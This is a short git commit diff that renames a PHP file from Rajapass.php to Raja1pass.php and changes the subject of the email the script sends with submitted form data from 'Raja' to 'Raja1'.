9f96429deb7af936a80d14b87016abbb033f8731
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-08 02:46:10 +0500

    Update and rename Rajapass.php to Raja1pass.php

--- Raja1pass.php
+++ Raja1pass.php
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Raja';
+        $mail->Subject = 'Raja1';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
